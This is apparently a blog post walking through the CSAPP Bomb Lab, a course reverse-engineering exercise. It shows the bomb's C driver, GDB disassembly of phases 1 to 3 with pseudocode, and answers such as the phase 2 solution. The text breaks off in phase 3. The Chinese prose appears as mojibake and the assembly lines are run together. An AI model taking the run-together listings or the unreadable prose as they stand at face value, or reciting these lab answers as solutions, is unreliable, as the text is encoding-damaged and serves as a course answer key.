    <content type="html"><![CDATA[<span id="more"></span><p>æœ¬ Lab å¯ä»¥è¯´æ˜¯ CSAPP çš„å‡ ä¸ª Lab ä¸­æœ€ä¸ºäººæ´¥æ´¥ä¹é“çš„ä¸€ä¸ªï¼Œå¯¹åº”çŸ¥è¯†ç‚¹ä¸ºä¹¦ä¸­çš„ç¬¬ 3 ç« ï¼ˆç¨‹åºçš„æœºå™¨çº§è¡¨ç¤ºï¼‰ï¼Œè¦æ±‚ä½¿ç”¨ GDB è°ƒè¯•å™¨ï¼Œå¯¹æ±‡ç¼–è¯­è¨€è¿›è¡Œè°ƒè¯•ï¼Œä»è€Œå¾—å‡ºæ­£ç¡®çš„â€œæ‹†å¼¹å¯†ç â€ã€‚å…±åˆ†ä¸º 6 ä¸ªå…³å¡å’Œä¸€ä¸ªéšè—å…³å¡ï¼Œæ¯ä¸ªå…³å¡éƒ½åˆ†åˆ«è€ƒå¯Ÿäº†ä¸€ç§è¯­æ³•ç»“æ„æˆ–æ•°æ®ç»“æ„çš„æ±‡ç¼–è¡¨ç¤ºï¼Œéƒ¨åˆ†å…³å¡é€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œè¦æ±‚å¯¹ x86 æ±‡ç¼–æœ‰ä¸€å®šçš„ç†Ÿæ‚‰åº¦ã€‚</p><h1 id="bomb-c"><a href="#bomb-c" class="headerlink" title="bomb.c"></a>bomb.c</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">;</span>    <span class="token comment">/* Note to self: remember to port this bomb to Windows and put a     * fantastic GUI on it. */</span>    <span class="token comment">/* When run with no arguments, the bomb reads its input lines     * from standard input. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        infile <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* When run with one argument &lt;file>, the bomb reads from &lt;file>     * until EOF, and then switches to standard input. Thus, as you     * defuse each phase, you can add its defusing string to &lt;file> and     * avoid having to retype it. */</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>infile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Error: Couldn't open %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* You can't call the bomb with more than 1 command line argument. */</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s [&lt;input_file>]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span>    <span class="token function">initialize_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"which to blow yourself up. Have a nice day!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Hmm...  Six phases must be more secure than one phase! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">/* Get input                   */</span>    <span class="token function">phase_1</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* Run the phase               */</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* Drat!  They figured it out!                                      * Let me know how they did it. */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Phase 1 defused. How about the next one?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* The second phase is harder.  No one will ever figure out     * how to defuse this... */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_2</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"That's number 2.  Keep going!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* I guess this is too easy so far.  Some more complex code will     * confuse people. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_3</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Halfway there!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_4</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So you got that one.  Try this one.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Round and 'round in memory we go, where we stop, the bomb blows! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_5</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good work!  On to the next...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* This phase will never be used, since no one will get past the     * earlier ones.  But just in case, make this one extra hard. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_6</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Wow, they got it!  But isn't something... missing?  Perhaps     * something they overlooked?  Mua ha ha ha ha! */</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>é¦–å…ˆè§‚å¯Ÿ <code>bomb.c</code> çš„ main å‡½æ•°ç»“æ„ï¼Œæœ€å¼€å§‹åˆ¤æ–­ argc æ˜¯å¦ä¸º 1ï¼Œå¦‚æœä¸º 1ï¼Œè¡¨ç¤ºè¿è¡Œ bomb ç¨‹åºæ—¶æ²¡æœ‰æŒ‡å®šå‘½ä»¤è¡Œå‚æ•°ï¼Œå³ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å– â€œæ‹†å¼¹å¯†ç â€ï¼›å¦åˆ™ï¼Œä»æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å–ã€‚ä¸ºäº†åç»­è°ƒè¯•çš„æ–¹ä¾¿ï¼Œå¯ä»¥å°†æ‰€æœ‰çš„å¯†ç å†™å…¥ä¸€ä¸ªæ–‡ä»¶ <code>ans.txt</code> ä¸­ï¼Œåç»­åœ¨å¯åŠ¨ bomb ç¨‹åºæ—¶å¯¹å…¶æŒ‡å®šï¼š<code>./bomb ans.txt</code>.</p><p>éšåä¾¿æ˜¯åˆå§‹åŒ–â€œç‚¸å¼¹â€ï¼Œæ¯æ¬¡è¯»å–ä¸€è¡Œå¯†ç ï¼Œåˆ©ç”¨è¯¥å¯†ç è¿›è¡Œâ€œæ‹†å¼¹â€ï¼Œå¦‚æœæ­£ç¡®ï¼Œåˆ™è¿›å…¥ä¸‹ä¸€å…³å¡ï¼Œå¦åˆ™ï¼Œâ€œç‚¸å¼¹â€å°±ä¼šçˆ†ç‚¸ï¼Œâ€œæ‹†å¼¹â€å¤±è´¥ã€‚ä¸€æ¬¡æ€§è¾“å¯¹ 6 ä¸ªå¯†ç åï¼Œâ€œç‚¸å¼¹â€å°±ä¼šè¢«â€œæ‹†é™¤â€ã€‚</p><p>æ³¨æ„æœ€åçš„æ³¨é‡Šï¼š</p><blockquote><p>Wow, they got it!  But isnâ€™t somethingâ€¦ missing?  Perhaps something they overlooked?  Mua ha ha ha ha!</p></blockquote><p>ä¸€å®šç¨‹åº¦ä¸Šæš—ç¤ºäº†éšè—å…³å¡çš„å­˜åœ¨ã€‚</p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>æ¯æ¬¡æ‹†å¼¹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>disas</code> å‘½ä»¤è¿›è¡Œåæ±‡ç¼–ï¼ŒæŸ¥çœ‹å‡½æ•°å¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œä»¥ä¸‹æ˜¯ <code>disas phase_1</code> çš„ç»“æœï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp0x0000000000400efb &lt;+27&gt;:    ret</code></pre><p>çƒ­èº«å…³å¡ï¼Œä»£ç çš„é€»è¾‘å¾ˆç®€å•ï¼Œè¯»å–ä¸€è¡Œå¯†ç ï¼Œåˆ¤æ–­è¯¥å¯†ç ä¸äº‹å…ˆæŒ‡å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒï¼Œå¦‚æœä¸ç›¸åŒï¼Œåˆ™â€œå¼•çˆ†ç‚¸å¼¹â€ã€‚</p><p>è¿™é‡Œéœ€è¦ç†Ÿæ‚‰ x86 å¯„å­˜å™¨çš„ä½¿ç”¨æƒ¯ä¾‹ï¼ˆä¹Ÿå¯ä»¥ GDB è‡ªè¡Œè°ƒè¯•ï¼‰ï¼Œå¯„å­˜å™¨ <code>%rdi</code> å¯„å­˜å™¨ <code>%rsi</code> åˆ†åˆ«ä½œä¸ºå‡½æ•°è°ƒç”¨æ—¶çš„å‚æ•° 1 å’Œå‚æ•° 2ã€‚åœ¨è¿™é‡Œï¼Œ<code>%rdi</code> å­˜å‚¨ç€è¯»å–åˆ°çš„å¯†ç å­—ç¬¦ä¸²ï¼ˆå‡†ç¡®æ¥è¯´ï¼Œæ˜¯å­—ç¬¦ä¸²é¦–å­—æ¯çš„åœ°å€ï¼‰ï¼Œè€Œ <code>%rsi</code> åˆ™è¢«èµ‹å€¼ä¸º <code>0x402400</code>ï¼Œç„¶åï¼Œå°†è¿™ä¸¤ä¸ªåœ°å€ä½œä¸ºå‚æ•° 1 å’Œå‚æ•° 2ï¼Œè°ƒç”¨ <code>string_not_equal</code>ï¼Œä»å‡½æ•°åç§°ä¸Šçœ‹ï¼Œè¯¥å‡½æ•°ç”¨æ¥åˆ¤å®šä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒã€‚é‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œå¯†ç å°±æ˜¯åœ°å€ <code>0x402400</code> å¤„çš„å­—ç¬¦ä¸²å€¼ï¼Œä½¿ç”¨ <code>x/s 0x402400</code> æŸ¥çœ‹å³å¯ã€‚</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p1.png"></p><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp0x0000000000400efd &lt;+1&gt;:     push   %rbx0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp0x0000000000400f40 &lt;+68&gt;:    pop    %rbx0x0000000000400f41 &lt;+69&gt;:    pop    %rbp0x0000000000400f42 &lt;+70&gt;:    ret</code></pre><p>è¿™ä¸€å…³ä¸»è¦æ˜¯è€ƒå¯Ÿ <strong>å¾ªç¯è¯­å¥</strong> ï¼Œå¯ä»¥ä»”ç»†é˜…è¯»ä¹¦ä¸­ç¬¬ 3.6.7 èŠ‚ï¼ŒåŠ å¼ºå¯¹æ±‡ç¼–çš„å¾ªç¯ç»“æ„çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œå¦‚æœæ„Ÿè§‰æ€è·¯å¾ˆä¹±ï¼Œå¯ä»¥é‡‡ç”¨ä¸ä¹¦ä¸­ç±»ä¼¼çš„æ–¹æ³•ï¼šå…ˆå°†æ±‡ç¼–ç¿»è¯‘ä¸ºç­‰ä»·çš„å¸¦ goto çš„é«˜çº§è¯­è¨€ï¼Œå†å‚è€ƒå‡ ç§å…¸å‹çš„å¾ªç¯å½¢å¼ï¼Œå°† goto æ”¹å†™ä¸ºå¾ªç¯ç»“æ„ï¼Œä»¥ä¸‹ä¾¿æ˜¯æœ€ç»ˆç¿»è¯‘å¾—åˆ°çš„ç±» C è¯­è¨€ä¼ªä»£ç ï¼š</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_six_numbers();if (Mem[%rsp] !&#x3D; 1) &#123;    explode_bomb();&#125;for (%rbx &#x3D; %rsp + 4, %rbp &#x3D; %rsp + 24; %rbx !&#x3D; %rbp; %rbx +&#x3D; 4) &#123;    %eax &#x3D; Mem[%rbx - 4];  &#x2F;&#x2F; ä¸Šä¸€ä¸ªå…ƒç´     %eax *&#x3D; 2;    if (Mem[%rbx] !&#x3D; %eax) &#123;        explode_bomb();    &#125;&#125;</code></pre><p>é¦–å…ˆæ³¨æ„åˆ° <code>read_six_numbers()</code> å‡½æ•°ï¼Œå­—é¢æ„æ€æ˜¯è¯»å– 6 ä¸ªæ•°å­—ï¼Œæ¨æµ‹å¯†ç ç”± 6 ä¸ªæ•°å­—ç»„æˆã€‚</p><p>ç„¶ååˆ¤æ–­ <code>Mem[%rsp]</code> çš„å€¼æ˜¯å¦ä¸º 1ï¼Œä¸æ˜¯åˆ™â€œçˆ†ç‚¸â€ã€‚è¿™é‡Œå¯ä»¥å–„ç”¨ GDBï¼Œå…ˆéšä¾¿è’™ 6 ä¸ªæ•°å­—ï¼Œç„¶åä½¿ç”¨ <code>p/x</code> æ‰“å° <code>Mem[%rsp]</code> çš„å€¼ï¼Œå‘ç°å…¶å€¼æ­£å¥½ç­‰äºè¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—ï¼Œç»“åˆåé¢çš„ 6 æ¬¡å¾ªç¯å¯çŸ¥ï¼Œè¾“å…¥çš„ç¬¬ i ï¼ˆi ä» 0 å¼€å§‹ï¼‰ä¸ªæ•°å­—å­˜å‚¨åœ¨åœ°å€ <code>%rsp + 4 * i</code> å¤„ï¼Œä¸”æ¯ä¸ªæ•°å­—éƒ½å¿…é¡»ä¸ºå®ƒå‰ä¸€ä¸ªæ•°å­—çš„ä¸¤å€ã€‚</p><p>é‚£ä¹ˆä»£ç é€»è¾‘ä¾¿ç†æ¸…æ¥šäº†ï¼šè¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—ä¸º 1ï¼Œå…¶åæ¯ä¸€ä¸ªæ•°å­—éƒ½ä¸ºå‰ä¸€ä¸ªæ•°å­—çš„ä¸¤å€ï¼Œå¯†ç ä¸ºï¼š<code>1 2 4 8 16 32</code>.</p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp0x0000000000400fcd &lt;+138&gt;:   ret</code></pre><p>è¿™ä¸€å…³çš„ä»£ç é‡æ¯”è¾ƒå¤§ï¼Œä½†æ˜¯ä¸­é—´ä¸€æ®µçœ‹èµ·æ¥å¾ˆæœ‰è§„å¾‹ï¼Œå°¤å…¶æ³¨æ„è¿™ä¸€å¥ï¼š<code>jmp  *0x402470(, %rax, 8)</code>ï¼Œç›´æ¥æ ¹æ® <code>%rax</code> å¯„å­˜å™¨çš„å€¼è®¡ç®—åç§»é‡è¿›è¡Œè·³è½¬ï¼Œè¿™ä¾¿æ˜¯ <strong>switch è¯­å¥</strong> æ‰€é‡‡ç”¨çš„è·³è½¬æ–¹å¼ï¼Œåœ°å€ <code>0x402470</code> å³è·³è½¬è¡¨çš„é¦–åœ°å€ã€‚</p><p>å¦å¤–ï¼Œè¿˜éœ€è¦å…³æ³¨çš„ä¸€æ¡æŒ‡ä»¤æ˜¯ <code>call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</code>ï¼Œè²Œä¼¼æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨æŒ‡ä»¤ï¼Œä»¥ä¸‹æ˜¯æˆ‘å€ŸåŠ©å¤§è¯­è¨€æ¨¡å‹å¾—åˆ°çš„è§£é‡Šï¼š</p><blockquote><p><code>__isoc99_sscanf@plt</code> æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>sscanf</code> å‡½æ•°çš„ PLTï¼ˆProcedure Linkage Tableï¼‰å…¥å£ç‚¹çš„ç¬¦å·å¼•ç”¨ã€‚<code>sscanf</code> å‡½æ•°æ˜¯ C è¯­è¨€æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºä»è¾“å…¥æµä¸­æŒ‰ç…§æŒ‡å®šæ ¼å¼è¯»å–æ•°æ®ã€‚<code>@plt</code> è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªé€šè¿‡åŠ¨æ€é“¾æ¥çš„ç¨‹åºè·³è½¬è¡¨ï¼ˆProcedure Linkage Tableï¼‰æ¥è°ƒç”¨çš„å‡½æ•°ã€‚</p><h3 id="å‚æ•°ä¼ é€’"><a href="#å‚æ•°ä¼ é€’" class="headerlink" title="å‚æ•°ä¼ é€’"></a>å‚æ•°ä¼ é€’</h3><p>åœ¨ x86-64 æ¶æ„ä¸­ï¼Œå‡½æ•°å‚æ•°é€šå¸¸æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ã€‚å¯¹äº <code>sscanf</code> å‡½æ•°ï¼Œå®ƒçš„å‚æ•°å¦‚ä¸‹ï¼š</p><ul><li><code>%rdi</code>ï¼šç¬¬ä¸€ä¸ªå‚æ•°ï¼Œé€šå¸¸æ˜¯æ–‡ä»¶æè¿°ç¬¦æˆ–æŒ‡é’ˆç±»å‹ã€‚å¯¹äº <code>sscanf</code>ï¼Œè¿™æ˜¯æŒ‡å‘è¾“å…¥å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚</li><li><code>%rsi</code>ï¼šç¬¬äºŒä¸ªå‚æ•°ï¼ŒæŒ‡å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚</li><li><code>%rdx</code>ï¼šç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœæœ‰çš„è¯ï¼ŒæŒ‡å‘ç¬¬ä¸€ä¸ªè¦å¡«å……çš„å˜é‡çš„åœ°å€ã€‚</li><li>æ›´å¤šçš„å‚æ•°ä¼šç»§ç»­ä½¿ç”¨åç»­çš„å¯„å­˜å™¨ <code>%rcx</code>, <code>%r8</code>, å’Œ <code>%r9</code>ã€‚å¦‚æœå‚æ•°è¶…è¿‡å…­ä¸ªï¼Œé‚£ä¹ˆå®ƒä»¬å°†ä¼šé€šè¿‡æ ˆä¼ é€’ã€‚</li></ul><h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><p>åœ¨ x86-64 æ¶æ„ä¸­ï¼Œè¿”å›å€¼ä¼šè¢«æ”¾åœ¨ <code>%rax</code> å¯„å­˜å™¨ä¸­ã€‚<code>sscanf</code> è¿”å›æˆåŠŸåŒ¹é…å’Œèµ‹å€¼çš„é¡¹æ•°ï¼Œå¦‚æœæ²¡æœ‰ä»»ä½•åŒ¹é…ï¼Œåˆ™è¿”å›é›¶ã€‚å¦‚æœè¾“å…¥ç»“æŸå‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å°±è¢«è€—å°½äº†ï¼Œä¹Ÿè¿”å›é›¶ã€‚å¦‚æœé‡åˆ°ä»»ä½•è¯»å–é”™è¯¯ï¼ˆå¦‚è¯»å–ä¸€ä¸ªæ•´æ•°ä½†è¾“å…¥ä¸æ˜¯æœ‰æ•ˆçš„æ•´æ•°ï¼‰ï¼Œåˆ™è¿”å›è´Ÿæ•°ã€‚</p></blockquote><p>ç®€è€Œè¨€ä¹‹ï¼Œ<code>sscanf</code> ç±»ä¼¼äº <code>scanf</code>ï¼Œåªæ˜¯è¾“å…¥ä»æ ‡å‡†è¾“å…¥å˜æˆäº†æŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚åœ¨è¿™é‡Œï¼Œ<code>sscanf</code> æŒ‡å®šäº† 4 ä¸ªå‚æ•°ï¼Œä½œç”¨ä¸ºï¼šä» <code>%rdi</code> å¯„å­˜å™¨æŒ‡å‘çš„å­—ç¬¦ä¸²ä¸­è¿›è¡Œè¯»å–ï¼Œ<code>%rsi</code> æŒ‡å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œ<code>%rdx</code> å’Œ <code>%rcx</code> åˆ†åˆ«æŒ‡å‘è¢«æ ¼å¼åŒ–è¯»å–åˆ°çš„å˜é‡ 1 å’Œå˜é‡ 2. è‹¥è¯»å–æˆåŠŸï¼Œåˆ™è¿”å›æˆåŠŸè¯»å–çš„é¡¹æ•°ï¼Œå³ä¸º 2ï¼Œå­˜å…¥ <code>%rax</code> å¯„å­˜å™¨ä¸­ã€‚</p><p>æŸ¥çœ‹ <code>0x4025cf</code> å¤„çš„å­—ç¬¦ä¸²ï¼Œå³æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¸º <code>%d %d</code>ï¼Œè¯´æ˜è¯»å–çš„ä¸¤ä¸ªå€¼éƒ½ä¸ºåè¿›åˆ¶æ•´æ•°ï¼Œå³æœ¬å…³å¯†ç çš„å½¢å¼ã€‚</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3.png"></p><p>æœ€åæŸ¥çœ‹ä¸€ä¸‹æ•´å¼ è·³è½¬è¡¨çš„å€¼ï¼Œæ ¹æ®æœ€ç»ˆè·³è½¬åˆ°çš„ä½ç½®ç¡®å®šè¾“å…¥çš„å€¼ã€‚</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3-2.png"></p><p>ç„¶åå°†å…¶æ”¹å†™ä¸º switch è¯­å¥ï¼Œä¸‹é¢ç›´æ¥ç»™å‡ºå®Œæ•´ä»£ç çš„ç¿»è¯‘ç»“æœï¼š</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax &lt;&#x3D; 1) &#123;          &#x2F;&#x2F; è¯»å–æˆåŠŸçš„å€¼ä¸ªæ•°å°äº2    